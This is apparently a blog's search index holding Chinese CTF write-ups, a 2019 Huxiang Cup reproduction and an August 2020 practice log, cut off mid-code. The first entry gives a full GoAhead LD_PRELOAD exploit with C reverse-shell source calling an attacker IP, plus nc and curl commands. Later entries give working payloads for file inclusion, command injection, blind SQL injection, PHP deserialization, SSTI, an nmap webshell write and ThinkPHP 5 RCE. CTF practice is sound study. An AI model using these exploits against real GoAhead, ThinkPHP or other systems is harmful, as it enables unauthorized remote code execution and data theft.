<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>湖湘杯2019复现</title>
    <url>/2019/11/2019%E6%B9%96%E6%B9%98%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><p>打开<a href="http://183.129.189.62:13900/index.html" target="_blank" rel="noopener">链接</a>,没什么东西。</p><p>查看源码</p><p><img src="/2019/11/2019湖湘杯web复现/image-20191109213839151.png" alt="image-20191109213839151"></p><p>进入提示的页面</p><p><img src="/2019/11/2019湖湘杯web复现/image-20191109214035812.png" alt="image-20191109214035812"></p><p>发现是GoAhead/3.6.4</p><p>百度了一下，发现 GoAhead 3.6.5之前的版本（2.5.0 – 3.6.4） 有个远程代码执行的漏洞</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>GoAhead在接收到请求后，将会从URL参数中取出键和值注册进CGI程序的环境变量，且只过滤了REMOTE_HOST和HTTP_AUTHORIZATION。我们能够控制环境变量，就有很多攻击方式。比如在Linux中，LD_开头的环境变量和动态链接库有关，如LD_PRELOAD中指定的动态链接库，将会被自动加载；LD_LIBRARY_PATH指定的路径，程序会去其中寻找动态链接库。</p><a id="more"></a>







<p>我们可以指定LD_PRELOAD=/proc/self/fd/0，因为/proc/self/fd/0是标准输入，而在CGI程序中，POST数据流即为标准输入流。我们编译一个动态链接库，将其放在POST Body中，发送给<a href="https://link.jianshu.com?t=http%3A%2F%2Ftarget%2Fcgi-bin%2Findex%3FLD_PRELOAD%3D%2Fproc%2Fself%2Ffd%2F0" target="_blank" rel="noopener">http://target/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0</a>，CGI就会加载我们发送的动态链接库，造成远程命令执行漏洞。</p>
<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>漏洞产生于goahead/src/cgi.c:cgiHandler中，程序遍历了用户访问时所带的参数，验证如果参数不为REMOTE_HOST或HTTP_AUTHORIZATION，则将其存储至envp数组。<br> 该数组将作为接下来cgi调用的环境变量。可以看出正是这里对于参数的过滤不全，导致了用户可以修改CGI程序的LD_PRELOAD环境变量,致使漏洞存在。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>编写payload.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">before_main</span><span class="params">(<span class="keyword">void</span>)</span> __<span class="title">attribute__</span><span class="params">((constructor))</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">before_main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> sock = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">attacker_addr</span> = &#123;</span><span class="number">0</span>&#125;;</span><br><span class="line">attacker_addr.sin_family = AF_INET;</span><br><span class="line">attacker_addr.sin_port = htons(<span class="number">1234</span>);</span><br><span class="line">attacker_addr.sin_addr.s_addr = inet_addr(<span class="string">"ip地址"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">connect</span>(sock, (struct sockaddr *)&amp;attacker_addr,<span class="keyword">sizeof</span>(attacker_addr))!=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">dup2(sock, <span class="number">0</span>);</span><br><span class="line">dup2(sock, <span class="number">1</span>);</span><br><span class="line">dup2(sock, <span class="number">2</span>);</span><br><span class="line">execve(<span class="string">"/bin/sh"</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译动态库(注意和服务器环境相似)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -shared -fPIC ./payload.c -o payload.so</span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/2019湖湘杯web复现/image-20191109223215495.png" alt="image-20191109223215495"></p>
<p>会报错，但不影响使用</p>
<p>服务器先监听1234端口</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/2019湖湘杯web复现/image-20191109222241231.png" alt="image-20191109222241231"></p>
<p>然后执行payload</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -X POST --data-binary @payload.so http://183.129.189.62:13900/cgi-bin/index?LD_PRELOAD\=/proc/self/fd/0 -i | head</span><br></pre></td></tr></table></figure>

<p>服务错误就多运行几次</p>
<p><img src="/2019/11/2019湖湘杯web复现/image-20191109222659969.png" alt="image-20191109222659969"></p>
<p>得到flag</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WEB</tag>
        <tag>复现</tag>
      </tags>
  </entry>
  <entry>
    <title>8月刷题记录</title>
    <url>/2020/08/8%E6%9C%88%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h3><p>伪协议加文件包含</p><p><code>?file=php://filter/read/convert.base64-encode/resource=flag.php</code></p><h3 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h3><p>命令执行</p><p><code>127.0.0.1;cat /flag</code></p><h3 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h3><a id="more"></a>



<p>看题目直接扫目录</p>
<p><img src="/2020/08/8月刷题记录/image-20200802182510227.png" alt="image-20200802182510227"></p>
<p><img src="/2020/08/8月刷题记录/image-20200802182531380.png" alt="image-20200802182531380"></p>
<p>弱类型比较</p>
<p><code>?key=123</code></p>
<h3 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h3><p>phtml绕过</p>
<p><img src="/2020/08/8月刷题记录/image-20200802184054101.png" alt="image-20200802184054101"></p>
<p><img src="/2020/08/8月刷题记录/image-20200802184125661.png" alt="image-20200802184125661"></p>
<h3 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h3><p>过滤了union、and、or、空格等，包括<code>/**/</code></p>
<p>输入<code>1/1</code>时会正常返回结果，可以判断这是数字型的sql注入。</p>
<p>可以用<code>()</code>绕过空白符</p>
<p>payload</p>
<p><code>if(ascii(substr((select(flag)from(flag)),1,1))=ascii(&#39;f&#39;),1,2)</code></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://1bc1fd51-0f6f-43b5-bd9e-c19e86a6e238.node3.buuoj.cn/index.php'</span></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        payload = <span class="string">"if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,2)"</span>.format(x, mid)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"id"</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url, data = data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Hello'</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    result += chr(int(mid))</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>

<h3 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>首先传参 <code>text=welcome to the zjctf</code> 这里要注意<code>file_get_contents</code>，不能直接GET传参，要通过伪协议。</p>
<p>data：text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</p>
<p>input: text=php://input,然后POST <code>welcome to the zjctf</code></p>
<p><img src="/2020/08/8月刷题记录/image-20200808211240153.png" alt="image-20200808211240153"></p>
<p>按照提示读取<code>useless.php</code></p>
<p><img src="/2020/08/8月刷题记录/image-20200808211342281.png" alt="image-20200808211342281"></p>
<p>useless.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>exp.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> $file=<span class="string">'flag.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a= <span class="keyword">new</span> Flag();</span><br><span class="line">$a = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/8月刷题记录/image-20200808211534697.png" alt="image-20200808211534697"></p>
<h3 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="BJDCTF2020]Easy MD5"></a>BJDCTF2020]Easy MD5</h3><p>headers中有提示</p>
<p><img src="/2020/08/8月刷题记录/image-20200808223026062.png" alt="image-20200808223026062"></p>
<p>md5($pass,true)的结果是原始的二进制格式字符串，拼接到语句中就可能会造成SQL注入。</p>
<p>具体参考：<em><a href="http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/" target="_blank" rel="noopener">http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/</a></em></p>
<p>输入密码 <code>ffifdyop</code>，即可登录。</p>
<p>来到下一关</p>
<p><img src="/2020/08/8月刷题记录/image-20200808223634396.png" alt="image-20200808223634396"></p>
<p>直接数组绕过</p>
<p><code>http://3a0f2829-16ea-4ecd-b023-04ac47f0511a.node3.buuoj.cn/levels91.php?a[]=2&amp;b[]=3</code></p>
<p>下一关</p>
<p><img src="/2020/08/8月刷题记录/image-20200808223852953.png" alt="image-20200808223852953"></p>
<p>还是数组绕过</p>
<p>或者利用<a href="https://xz.aliyun.com/t/2232" target="_blank" rel="noopener">工具</a>碰撞</p>
<p><img src="/2020/08/8月刷题记录/image-20200808230558650.png" alt="image-20200808230558650"></p>
<h3 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h3><p>随便输个字符串，会直接返回输入的字符串。结果的源码提示了SSTI</p>
<p><code>1</code>返回1，确实存在SSTI。而且没过滤。</p>
<p>查看根目录</p>
<figure class="highlight clojure"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval(<span class="string">"__import__('os').popen('ls /').read()"</span>)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>接着用上面的读取flag即可</p>
<h3 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class="line">  $_SERVER[<span class="string">'REMOTE_ADDR'</span>] = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'host'</span>])) &#123;</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  $host = $_GET[<span class="string">'host'</span>];</span><br><span class="line">  $host = escapeshellarg($host);</span><br><span class="line">  $host = escapeshellcmd($host);</span><br><span class="line">  $sandbox = md5(<span class="string">"glzjin"</span>. $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'you are in sandbox '</span>.$sandbox;</span><br><span class="line">  @mkdir($sandbox);</span><br><span class="line">  chdir($sandbox);</span><br><span class="line">  <span class="keyword">echo</span> system(<span class="string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>escapeshellarg()</code>和 <code>escapeshellcmd(t)</code>同时使用会造成单引号逃逸</p>
<p>具体参考：<a href="https://paper.seebug.org/164/" target="_blank" rel="noopener">https://paper.seebug.org/164/</a></p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>传入的参数是：<span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>' -v -d a=<span class="number">1</span></span><br><span class="line"><span class="number">2.</span>经过escapeshellarg处理后变成了'<span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>'\'' -v -d a=<span class="number">1</span>'，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</span><br><span class="line"><span class="number">3.</span>经过escapeshellcmd处理后变成'<span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>'\\'' -v -d a=<span class="number">1</span>\'，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义</span><br><span class="line"><span class="number">4.</span>最后执行的命令是curl '<span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>'\\'' -v -d a=<span class="number">1</span>\'，由于中间的\\被解释为\而不再是转义字符，所以后面的'没有被转义，与再后面的'配对儿成了一个空白连接符。所以可以简化为curl <span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>\ -v -d a=<span class="number">1</span>'，即向<span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>\发起请求，POST 数据为a=<span class="number">1</span>'。</span><br></pre></td></tr></table></figure>

<p>然后 nmap命令中 有一个参数-oG可以实现将命令和结果写到文件</p>
<p>payload host=<code>&#39; &lt;?php @eval($_POST[&quot;a&quot;]);?&gt; -oG a.php &#39;</code></p>
<h3 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h3><p>WEB-INF/web.xml泄露</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">WEB-INF主要包含一下文件或目录:</span><br><span class="line">/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line">/WEB-INF/classes/：含了站点所有用的 <span class="class"><span class="keyword">class</span> 文件，包括 <span class="title">servlet</span> <span class="title">class</span> 和非<span class="title">servlet</span> <span class="title">class</span>，他们不能包含在 .<span class="title">jar</span>文件中</span></span><br><span class="line">/WEB-INF/<span class="class"><span class="keyword">lib</span>/：存放<span class="title">web</span>应用需要的各种<span class="title">JAR</span>文件，放置仅在这个应用中要求使用的<span class="title">jar</span>文件,如数据库驱动<span class="title">jar</span>文件</span></span><br><span class="line">/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">/WEB-INF/database.properties：数据库配置文件</span><br><span class="line">漏洞检测以及利用方法：通过找到web.xml文件，推断<span class="class"><span class="keyword">class</span>文件的路径，最后直接下载<span class="title">class</span>文件，在通过反编译<span class="title">class</span>文件，得到网站源码</span></span><br></pre></td></tr></table></figure>

<p>漏洞成因：</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。一般情况，jsp引擎默认都是禁止访问WEB<span class="literal">-INF</span>目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB<span class="literal">-INF</span>目录就好了： <span class="keyword">location</span> <span class="title">~ ^/WEB-INF</span>/* &#123; <span class="keyword">deny</span> all; &#125; 或者return <span class="number">404</span>; 或者其他！</span><br></pre></td></tr></table></figure>

<p>第一个坑，download请求要POST参数，GET无效</p>
<p>先读取web.xml</p>
<p><img src="/2020/08/8月刷题记录/image-20200809090311609.png" alt="image-20200809090311609"></p>
<p>再读取<code>FlagController.class</code></p>
<p><img src="/2020/08/8月刷题记录/image-20200809090432741.png" alt="image-20200809090432741"></p>
<h3 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h3><p>页面源码有一串字符，先Base32后Base64解码</p>
<p><code>select * from user where username = &#39;$name&#39;</code></p>
<p>然后测试下页面逻辑，先判断用户是否存在，不存在就返回<code>wrong user!</code>，存在则接着判断密码，密码错误则返回<code>wrong pass!</code></p>
<p>大概过滤了这些字符</p>
<p><img src="/2020/08/8月刷题记录/image-20200809092100640.png" alt="image-20200809092100640"></p>
<p>直接可以用联合注入，表里有三列</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>' <span class="keyword">Order</span> <span class="title">by</span> <span class="number">3</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>进行用联合注入，回显wrong user!，说明用户不在第一列</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>' union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>#</span><br></pre></td></tr></table></figure>

<p>尝试将用户名放在第二列，回显wrong pass!，找到用户名在第二列</p>
<figure class="highlight cs"><table><tr><td class="code"><pre><span class="line"><span class="number">1'</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="string">'admin'</span>,<span class="number">3</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p>用户名输入（‘e10adc3949ba59abbe56e057f20f883e’是 123456的md5值）</p>
<figure class="highlight cs"><table><tr><td class="code"><pre><span class="line"><span class="number">1'</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="string">'admin'</span>,<span class="string">'e10adc3949ba59abbe56e057f20f883e'</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>

<h3 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h3><p>主页提示ThinkPHP5框架，直接用exp打，报错得到版本信息</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">?s=index/think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func_array&amp;vars[<span class="string">0</span>]=system&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=whoami</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/8月刷题记录/image-20200809100312733.png" alt="image-20200809100312733"></p>
<p>然后直接用5.0.23exp打</p>
<figure class="highlight oxygene"><table><tr><td class="code"><pre><span class="line">/<span class="keyword">index</span>.php?s=captcha</span><br><span class="line">POST: _method=__construct&amp;filter[]=system&amp;<span class="function"><span class="keyword">method</span>=<span class="title">get</span>&amp;<span class="title">server</span>[<span class="title">REQUEST_METHOD</span>]=<span class="title">ls</span> -<span class="title">al</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/8月刷题记录/image-20200809100351723.png" alt="image-20200809100351723"></p>
<h3 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h3><p>源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)): <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> 